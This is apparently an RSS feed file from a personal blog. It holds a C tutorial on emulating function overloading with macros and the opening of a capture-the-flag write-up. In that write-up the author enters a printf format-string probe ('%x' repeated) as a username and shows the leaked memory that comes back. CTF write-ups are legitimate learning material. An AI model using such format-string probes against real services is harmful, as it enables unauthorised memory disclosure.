@@ -1,0 +1,530 @@
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+	<title>nikola&#39;s website</title>
+	<link>https://nmilo.net/tags/c&#43;&#43;/</link>
+	<description>Recent content in C&#43;&#43; on nikola&#39;s website</description>
+	<generator>Hugo -- gohugo.io</generator>
+	<language>en-us</language>
+	<lastBuildDate>Thu, 12 May 2022 00:00:00 +0000</lastBuildDate>
+    
+        <atom:link href="https://nmilo.net/tags/c++/index.xml" rel="self" type="application/rss+xml" />
+	
+	
+	<item>
+		<title>C has overloading, actually</title>
+		<link>https://nmilo.net/articles/overloading/</link>
+		<pubDate>Thu, 28 Dec 2023 00:00:00 +0000</pubDate>
+		
+		<guid>https://nmilo.net/articles/overloading/</guid>
+		<description>&lt;p&gt;&lt;a href=&#34;https://en.wikipedia.org/wiki/Function_overloading&#34;&gt;Function overloading&lt;/a&gt; is a feature added by C++ which is occasionally very useful. I&amp;rsquo;m not too sure if it&amp;rsquo;s worth the extra complexity—name mangling is can get very annoying sometimes—but every now and then overloading is a great feature to have. Today I wanted to show you two tricks to pretty much completely emulate C++ overloading&lt;/p&gt;
+&lt;h2 id=&#34;type-based-overloading&#34;&gt;Type-based overloading&lt;/h2&gt;
+&lt;p&gt;C11 adds the &lt;code&gt;_Generic&lt;/code&gt; keyword and &lt;a href=&#34;https://en.cppreference.com/w/c/language/generic&#34;&gt;type-generic expressions&lt;/a&gt;, which may make it seem like C has generics, but not really. It&amp;rsquo;s more like a type-based switch statement, added to the language exclusively to implement the functions in &lt;a href=&#34;https://en.cppreference.com/w/c/numeric/tgmath&#34;&gt;&lt;code&gt;&amp;lt;tgmath.h&amp;gt;&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;Generic expressions look like:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;_Generic ( &lt;/code&gt;controlling-expression&lt;code&gt;,&lt;/code&gt;association-list&lt;code&gt; )&lt;/code&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Where &amp;ldquo;controlling-expression&amp;rdquo; is an expression and &amp;ldquo;association-list&amp;rdquo; is a list of type to expression pairs. For example:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; foo &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;5&lt;/span&gt;;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;foos_type &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;_Generic&lt;/span&gt;(foo,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;it&amp;#39;s an int&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;float&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;it&amp;#39;s a float&amp;#34;&lt;/span&gt;,
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;default&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;idk&amp;#34;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Here the &lt;code&gt;_Generic&lt;/code&gt; expression acts like a switch statement on the type of &lt;code&gt;foo&lt;/code&gt; and can give us different results based on what type &lt;code&gt;foo&lt;/code&gt; is. One limitation is that each type expression has to be semantically valid, which can be &lt;a href=&#34;https://www.chiark.greenend.org.uk/~sgtatham/quasiblog/c11-generic/&#34;&gt;regarded as an oversight&lt;/a&gt;, but largely doesn&amp;rsquo;t affect us here.&lt;/p&gt;
+&lt;p&gt;If, before &lt;code&gt;_Generic&lt;/code&gt;, you would write this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;draw_circle&lt;/span&gt;(Circle circle) { ... }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;draw_rectangle&lt;/span&gt;(Rectangle rectangle) { ... }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;draw_point&lt;/span&gt;(Vector2 point) { ... }
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;you can now use a macro to switch between function choices.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;#define draw(obj) _Generic(obj,  \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;	Circle: draw_circle,         \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;	Rectangle: draw_rectangle,   \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;	Vector2: draw_point          \
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;)(obj)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Circle c &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; { .radius &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;5.0f&lt;/span&gt;; };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;draw&lt;/span&gt;(c);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Rectangle r &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; { .w &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, .h &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt; };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;draw&lt;/span&gt;(r);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	Vector2 v &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; { &lt;span style=&#34;color:#099&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;4&lt;/span&gt; };
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;draw&lt;/span&gt;(v);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;number-of-argumentsbased-overloading&#34;&gt;Number-of-arguments–based overloading&lt;/h2&gt;
+&lt;p&gt;Okay, that one was easy, we&amp;rsquo;re just using a C11 feature for entirely it&amp;rsquo;s intended purpose. Something more useful would be overloading based on the number of arguments passed. C libraries often need to specify somewhere in their name how many arguments they take, or their type (for example, from &lt;a href=&#34;https://www.raylib.com/cheatsheet/cheatsheet.html&#34;&gt;raylib&lt;/a&gt;):&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel&lt;/span&gt;(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; posX, &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; posY, Color color); &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// Draw a pixel
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixelV&lt;/span&gt;(Vector2 position, Color color);  &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// Draw a pixel (Vector version)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It would be nice if we could call both of these with just &lt;code&gt;DrawPixel(...)&lt;/code&gt;. That way if we ever change to passing a vector, we only need to change one thing. Luckily, with some macro magic, we can. First we&amp;rsquo;ll name our 2 &amp;ldquo;overloads&amp;rdquo; by the number of arguments they take:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel2&lt;/span&gt;(Vector2 position, Color color);  &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// Draw a pixel (Vector version)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel3&lt;/span&gt;(&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; posX, &lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; posY, Color color); &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// Draw a pixel
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then we can define a macro that always expands to its 4th argument.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;#define DrawPixelX(a,b,c,d,...)   d
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Finally, this macro expands its arguments into &lt;code&gt;DrawPixelX&lt;/code&gt;, followed by the function names &lt;code&gt;DrawPixel3&lt;/code&gt; and &lt;code&gt;DrawPixel2&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-weight:bold;font-style:italic&#34;&gt;#define DrawPixel(...)   DrawPixelX(__VA_ARGS__,DrawPixel3,DrawPixel2)(__VA_ARGS__)
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;If we give it 2 arguments, it expands like this:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel&lt;/span&gt;(v, WHITE)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixelX&lt;/span&gt;(v, WHITE, DrawPixel3,DrawPixel2)(v, WHITE) &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// expands to 4th argument
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel2&lt;/span&gt;(v, WHTIE)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;and for 3,&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel&lt;/span&gt;(&lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;, WHITE)
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixelX&lt;/span&gt;(&lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;, WHITE, DrawPixel3,DrawPixel2)(&lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt; WHITE) &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// expands to 4th argument
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;DrawPixel3&lt;/span&gt;(&lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;, WHTIE)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The trick is that by having &lt;code&gt;DrawPixelX&lt;/code&gt; always expand to its fourth argument, we can &amp;ldquo;push&amp;rdquo; the function we want forwards by the amount of arguments we pass in.&lt;/p&gt;
+&lt;h2 id=&#34;are-these-macro-hacks-really-a-good-idea&#34;&gt;Are these macro hacks really a good idea?&lt;/h2&gt;
+&lt;p&gt;I don&amp;rsquo;t know about real projects, but C macros (especially with C11 and C23) are a lot more powerful than many give credit for. Using the tricks above, plus some other hacks, we can even make a &lt;a href=&#34;https://github.com/n-milo/cfmt&#34;&gt;type-safe printf function&lt;/a&gt;:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;main&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    Vec3 v &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;=&lt;/span&gt; {&lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;2.5&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;3&lt;/span&gt;};
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// regular printing
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;PRINT&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;%; %; %; %; %&lt;/span&gt;&lt;span style=&#34;color:#d14&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;Hello world&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#099&#34;&gt;0xbeefbabe&lt;/span&gt;, v, &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;sinf&lt;/span&gt;(M_PI_4));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// -&amp;gt; &amp;#34;3; Hello world; 0xbeefbabe; {1, 2.5, 3}; 0.707107&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// missing arguments
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;PRINT&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;% + % = %&lt;/span&gt;&lt;span style=&#34;color:#d14&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// -&amp;gt; &amp;#34;1 + 2 = %!MISSING&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// extra arguments
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;PRINT&lt;/span&gt;(&lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;hi&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#099&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#099&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#d14&#34;&gt;&amp;#34;Hello world&amp;#34;&lt;/span&gt;, (&lt;span style=&#34;color:#458;font-weight:bold&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#099&#34;&gt;0xbeefbabe&lt;/span&gt;, v, &lt;span style=&#34;color:#900;font-weight:bold&#34;&gt;sinf&lt;/span&gt;(M_PI_4));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// -&amp;gt; &amp;#34;hi%!(EXTRA int=3, char*=Hello world, void*=0xbeefbabe, Vec3={1, 2.5, 3}, float=0.707107)&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// unknown type compile error
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#000;font-weight:bold&#34;&gt;struct&lt;/span&gt; foo {} f;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// PRINT(&amp;#34;%&amp;#34;, f);
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#998;font-style:italic&#34;&gt;// -&amp;gt; error: controlling expression type &amp;#39;struct foo&amp;#39; not compatible with any generic association type
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#998;font-style:italic&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+	</item>
+	
+	<item>
+		<title>QCTF experience and write-up</title>
+		<link>https://nmilo.net/articles/qctf/</link>
+		<pubDate>Sun, 22 Jan 2023 00:00:00 +0000</pubDate>
+		
+		<guid>https://nmilo.net/articles/qctf/</guid>
+		<description>&lt;p&gt;Yesterday I had the opportunity to compete in &lt;a href=&#34;https://qctf.ca/&#34;&gt;QCTF&lt;/a&gt;, the annual hacking capture-the-flag competition at Queen&amp;rsquo;s University. I came in not expecting much but in the end I was humbled by the challenges and impressed by the competiton. My team of 2 came in 5th place, which is not bad for my first CTF! Next year though I&amp;rsquo;m coming in with a larger team and more preparation.&lt;/p&gt;
+&lt;p&gt;The challenges were interesting, and I decided to write-up my solutions for the most difficult ones.&lt;/p&gt;
+&lt;h2 id=&#34;death-string-1&#34;&gt;Death String 1&lt;/h2&gt;
+&lt;p&gt;We&amp;rsquo;re given an ssh login which provides a username/password login prompt:&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;        ,▄═*5██▐██▀═▄,
+     ,═▀▄█▀▀&amp;#34;▄▄╓▄&amp;#34;▀▀█▄█¥┌
+   ,A▄█▀  ▄▄██████▄▄  ▀█▄▀,
+  ╓▀╙▀▄▄█████▌  ,█████▄▄▀▀/▄
+ ,▀█▀██▄▀`&amp;#34;███  ███▀ ▀█▄█╙█&amp;#34;▄
+ █▐█  ██▄,  `    `  ,▄██L ║▌█
+ ▌█▌ ▐█████▌      ▐█████▌ ▐█▐
+ █▐█  ██⌐   ▄    ▄   `██⌐ █▌█
+  ▌█▌▀▀▄█▄▄███  ███▄╓█▄█▀▄█╓⌐
+   ▄τ█▀└▀████▄,,▄████▀╙▀▄M▄^
+    ▀▄▀█▄ `▀▀██╫█▀▀└ ,▄██╛
+      ╙═█▀█▄▄▄█║█▄▄█▀█æ╙
+         &amp;#39;&amp;#34;ⁿ══==══ⁿ&amp;#34;└
+
+   Imperial Security Bureau
+
+username: admin
+password: password
+
+Welcome admin.
+
+Access denied: Invalid username or password. If you have forgotten your password,
+you can use an emergency override code instead.
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Immediately I see the username is echoed back, so I&amp;rsquo;m thinking this could be a &lt;code&gt;printf&lt;/code&gt;-exploitation challenge, so I put some format specifiers in the username to test.&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;username: %x%x%x%x%x%x%x
+password: password
+
+Welcome 636c65576b5600636c65576b78808ffffeb00ffffec00.
